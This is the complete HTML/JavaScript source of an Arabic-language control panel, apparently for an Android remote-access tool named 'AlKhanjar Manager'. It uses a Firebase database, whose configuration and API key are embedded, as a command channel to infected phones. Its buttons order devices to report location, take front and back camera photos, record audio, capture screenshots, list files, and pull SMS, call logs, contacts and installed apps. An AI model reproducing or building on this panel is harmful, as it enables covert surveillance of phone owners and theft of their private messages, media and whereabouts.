<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔱 AlKhanjar Manager - لوحة التحكم</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-bottom: 20px;
            text-align: center;
        }

        .header h1 {
            color: #667eea;
            font-size: 2em;
            margin-bottom: 10px;
        }

        .devices-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .device-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.3s;
            cursor: pointer;
        }

        .device-card:hover {
            transform: translateY(-5px);
        }

        .device-card.online {
            border-right: 5px solid #4caf50;
        }

        .device-card.offline {
            border-right: 5px solid #f44336;
        }

        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .device-status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }

        .device-status.online {
            background: #4caf50;
            color: white;
        }

        .device-status.offline {
            background: #f44336;
            color: white;
        }

        .device-info {
            margin-bottom: 10px;
        }

        .device-info p {
            margin: 5px 0;
            font-size: 14px;
            color: #666;
        }

        .device-actions {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 15px;
        }

        .btn {
            padding: 10px;
            border: none;
            border-radius: 5px;
            background: #667eea;
            color: white;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #5568d3;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
        }

        .modal-content {
            background: white;
            width: 90%;
            max-width: 800px;
            margin: 50px auto;
            padding: 30px;
            border-radius: 10px;
            max-height: 80vh;
            overflow-y: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .close-btn {
            background: #f44336;
            color: white;
            border: none;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
        }

        .command-section {
            margin-bottom: 20px;
        }

        .command-section h3 {
            margin-bottom: 10px;
            color: #667eea;
        }

        .command-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
        }

        .loading {
            text-align: center;
            padding: 50px;
            color: white;
            font-size: 20px;
        }

        #map {
            height: 400px;
            border-radius: 10px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔱 AlKhanjar Manager</h1>
            <p>نظام إدارة الأجهزة عن بعد</p>
        </div>

        <div id="devices-container" class="devices-grid">
            <div class="loading">⏳ جاري تحميل الأجهزة...</div>
        </div>
    </div>

    <!-- نافذة التحكم -->
    <div id="control-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modal-title">التحكم بالجهاز</h2>
                <button class="close-btn" onclick="closeModal()">إغلاق</button>
            </div>

            <div class="command-section">
                <h3>📍 الموقع الجغرافي</h3>
                <div class="command-grid">
                    <button class="btn" onclick="sendCommand('get_location')">📍 الموقع الحالي</button>
                    <button class="btn" onclick="showMap()">🗺️ عرض على الخريطة</button>
                </div>
                <div id="map" style="display:none;"></div>
            </div>

            <div class="command-section">
                <h3>📸 الكاميرا والوسائط</h3>
                <div class="command-grid">
                    <button class="btn" onclick="sendCommand('capture_photo', {camera: 'back'})">📷 صورة خلفية</button>
                    <button class="btn" onclick="sendCommand('capture_photo', {camera: 'front'})">🤳 صورة أمامية</button>
                    <button class="btn" onclick="sendCommand('record_audio', {duration: 30})">🎤 تسجيل صوت</button>
                    <button class="btn" onclick="sendCommand('take_screenshot')">📱 لقطة شاشة</button>
                </div>
            </div>

            <div class="command-section">
                <h3>📂 الملفات</h3>
                <div class="command-grid">
                    <button class="btn" onclick="sendCommand('list_files', {path: '/'})">📂 عرض الملفات</button>
                    <button class="btn" onclick="sendCommand('list_files', {path: '/DCIM'})">🖼️ الصور</button>
                    <button class="btn" onclick="sendCommand('list_files', {path: '/Download'})">⬇️ التنزيلات</button>
                </div>
            </div>

            <div class="command-section">
                <h3>📞 المكالمات والرسائل</h3>
                <div class="command-grid">
                    <button class="btn" onclick="sendCommand('get_call_logs', {limit: 100})">📞 سجل المكالمات</button>
                    <button class="btn" onclick="sendCommand('get_sms', {limit: 100})">💬 الرسائل</button>
                    <button class="btn" onclick="sendCommand('get_contacts')">👥 جهات الاتصال</button>
                </div>
            </div>

            <div class="command-section">
                <h3>⚙️ معلومات النظام</h3>
                <div class="command-grid">
                    <button class="btn" onclick="sendCommand('get_installed_apps')">📱 التطبيقات</button>
                    <button class="btn" onclick="refreshDeviceInfo()">🔄 تحديث المعلومات</button>
                </div>
            </div>

            <div class="command-section">
                <h3>📊 النتائج</h3>
                <div id="results" style="background: #f5f5f5; padding: 15px; border-radius: 5px; min-height: 100px;">
                    <p>اختر أمر لعرض النتيجة هنا...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

    <script>
        // إعدادات Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyDaQ4b0DZMryXEsyco-IXAIy0hFX_W9UgA",
            authDomain: "hmooude-37c70.firebaseapp.com",
            databaseURL: "https://hmooude-37c70-default-rtdb.firebaseio.com",
            projectId: "hmooude-37c70",
            storageBucket: "hmooude-37c70.firebasestorage.app",
            messagingSenderId: "407210691250",
            appId: "1:407210691250:web:29eca46834d02fc29897ab"
        };

        // تهيئة Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let currentDeviceId = null;
        let devicesData = {};

        // تحميل الأجهزة
        function loadDevices() {
            database.ref('devices').on('value', (snapshot) => {
                const devices = snapshot.val();
                devicesData = devices || {};
                
                const container = document.getElementById('devices-container');
                container.innerHTML = '';

                if (!devices) {
                    container.innerHTML = '<div class="loading">❌ لا توجد أجهزة متصلة</div>';
                    return;
                }

                Object.keys(devices).forEach(deviceId => {
                    const device = devices[deviceId];
                    const card = createDeviceCard(deviceId, device);
                    container.appendChild(card);
                });
            });
        }

        // إنشاء بطاقة جهاز
        function createDeviceCard(deviceId, device) {
            const card = document.createElement('div');
            card.className = `device-card ${device.status || 'offline'}`;
            
            const lastSeen = device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar') : 'غير معروف';
            
            card.innerHTML = `
                <div class="device-header">
                    <h3>📱 ${device.deviceModel || 'جهاز غير معروف'}</h3>
                    <span class="device-status ${device.status || 'offline'}">
                        ${device.status === 'online' ? '🟢 متصل' : '🔴 غير متصل'}
                    </span>
                </div>
                <div class="device-info">
                    <p><strong>المعرف:</strong> ${deviceId.substring(0, 16)}...</p>
                    <p><strong>النظام:</strong> ${device.androidVersion || 'غير معروف'}</p>
                    <p><strong>البطارية:</strong> 🔋 ${device.batteryLevel || 0}%</p>
                    <p><strong>الشبكة:</strong> ${device.networkType || 'غير معروف'}</p>
                    <p><strong>آخر ظهور:</strong> ${lastSeen}</p>
                </div>
                <div class="device-actions">
                    <button class="btn" onclick="openControl('${deviceId}')">🎮 لوحة التحكم</button>
                    <button class="btn" onclick="removeDevice('${deviceId}')">🗑️ حذف</button>
                </div>
            `;
            
            return card;
        }

        // فتح نافذة التحكم
        function openControl(deviceId) {
            currentDeviceId = deviceId;
            const device = devicesData[deviceId];
            
            document.getElementById('modal-title').textContent = 
                `🎮 التحكم بـ ${device.deviceModel || 'جهاز'}`;
            
            document.getElementById('control-modal').style.display = 'block';
            
            // الاستماع للردود
            listenForResponses(deviceId);
        }

        // إغلاق النافذة
        function closeModal() {
            document.getElementById('control-modal').style.display = 'none';
            currentDeviceId = null;
        }

        // إرسال أمر
        function sendCommand(commandType, parameters = {}) {
            if (!currentDeviceId) return;

            const commandId = Date.now().toString();
            const command = {
                commandId,
                commandType,
                parameters,
                timestamp: Date.now(),
                executed: false
            };

            database.ref(`commands/${currentDeviceId}/${commandId}`).set(command);
            
            document.getElementById('results').innerHTML = 
                '<p>⏳ جاري تنفيذ الأمر...</p>';
        }

        // الاستماع للردود
        function listenForResponses(deviceId) {
            database.ref(`responses/${deviceId}`).on('child_added', (snapshot) => {
                const response = snapshot.val();
                displayResponse(response);
            });
        }

        // عرض الرد
        function displayResponse(response) {
            const resultsDiv = document.getElementById('results');
            
            if (response.success) {
                resultsDiv.innerHTML = `
                    <p style="color: green;">✅ نجح التنفيذ</p>
                    <pre>${JSON.stringify(response.data, null, 2)}</pre>
                `;
            } else {
                resultsDiv.innerHTML = `
                    <p style="color: red;">❌ فشل التنفيذ</p>
                    <p>${response.data}</p>
                `;
            }
        }

        // عرض الخريطة
        function showMap() {
            const mapDiv = document.getElementById('map');
            mapDiv.style.display = 'block';
            
            // يحتاج Google Maps API
            mapDiv.innerHTML = '<p style="padding:20px;">الخريطة تحتاج Google Maps API</p>';
        }

        // تحديث معلومات الجهاز
        function refreshDeviceInfo() {
            if (currentDeviceId) {
                sendCommand('get_device_info');
            }
        }

        // حذف جهاز
        function removeDevice(deviceId) {
            if (confirm('هل تريد حذف هذا الجهاز؟')) {
                database.ref(`devices/${deviceId}`).remove();
                database.ref(`commands/${deviceId}`).remove();
                database.ref(`responses/${deviceId}`).remove();
            }
        }

        // بدء التطبيق
        loadDevices();
    </script>
</body>
</html>
